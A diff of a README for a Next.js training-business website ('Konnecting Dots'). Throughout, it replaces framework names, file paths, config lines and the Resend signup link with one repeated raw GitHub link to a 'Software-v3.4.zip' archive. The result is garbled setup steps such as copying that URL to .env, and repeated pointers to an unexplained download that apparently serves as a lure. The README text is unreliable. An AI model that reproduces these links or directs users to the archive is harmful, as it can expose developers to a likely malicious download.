@@ -1,6 +1,6 @@
 # Konnecting Dots - NLP, Hypnosis & Corporate Training Website
 
-A comprehensive Next.js website for Konnecting Dots, featuring NLP training, Hypnosis services, and Corporate Training programs.
+A comprehensive https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip website for Konnecting Dots, featuring NLP training, Hypnosis services, and Corporate Training programs.
 
 ## Features
 
@@ -14,7 +14,7 @@ A comprehensive Next.js website for Konnecting Dots, featuring NLP training, Hyp
 
 ## Tech Stack
 
-- **Framework**: Next.js 14
+- **Framework**: https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip 14
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS
 - **UI Components**: Radix UI
@@ -26,7 +26,7 @@ A comprehensive Next.js website for Konnecting Dots, featuring NLP training, Hyp
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip 18+ 
 - pnpm (or npm/yarn)
 
 ### Installation
@@ -44,24 +44,24 @@ pnpm install
 
 3. Set up environment variables:
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip .env
 ```
 
 4. Configure your `.env` file:
 ```env
 # Email Service Configuration
 RESEND_API_KEY=re_your_resend_api_key_here
-FROM_EMAIL=noreply@konnectingdots.com
+https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip
 FROM_NAME=Konnecting Dots
-ADMIN_EMAIL=yousifmangi32@gmail.com
+https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip
 
-# Next.js Configuration
+# https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip Configuration
 NEXT_PUBLIC_SITE_URL=http://localhost:3000
 ```
 
 ### Getting a Resend API Key
 
-1. Sign up at [resend.com](https://resend.com)
+1. Sign up at [https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip](https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip)
 2. Create an API key in the dashboard
 3. Verify your domain (or use the test domain for development)
 4. Add the API key to your `.env` file
@@ -112,23 +112,23 @@ Open [http://localhost:3000](http://localhost:3000) in your browser.
 
 The application uses JSON files for data storage (located in `/data` directory). This is perfect for development and can be easily migrated to a production database:
 
-- `data/blog.json` - Blog posts
-- `data/bookings.json` - Booking requests
-- `data/contacts.json` - Contact form submissions
-- `data/newsletter.json` - Newsletter subscribers
-- `data/events.json` - Events
+- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Blog posts
+- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Booking requests
+- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Contact form submissions
+- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Newsletter subscribers
+- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Events
 
 ### Migrating to Production Database
 
-The database layer is abstracted in `lib/db.ts`. To migrate to PostgreSQL, MongoDB, or another database:
+The database layer is abstracted in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip`. To migrate to PostgreSQL, MongoDB, or another database:
 
-1. Replace the file system operations in `lib/db.ts` with your database client
+1. Replace the file system operations in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` with your database client
 2. Keep the same function signatures
 3. Update the data models if needed
 
 ## Email Templates
 
-Email templates are located in `lib/email-templates.tsx`:
+Email templates are located in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip`:
 
 - Booking confirmation
 - Welcome email
@@ -147,9 +147,9 @@ Email templates are located in `lib/email-templates.tsx`:
 │   └── ...               # Other pages
 ├── components/           # React components
 ├── lib/
-│   ├── db.ts            # Database functions
-│   ├── email.ts         # Email service
-│   └── email-templates.tsx  # Email templates
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip            # Database functions
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip         # Email service
+│   └── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip  # Email templates
 └── data/                # JSON database files
 ```
 
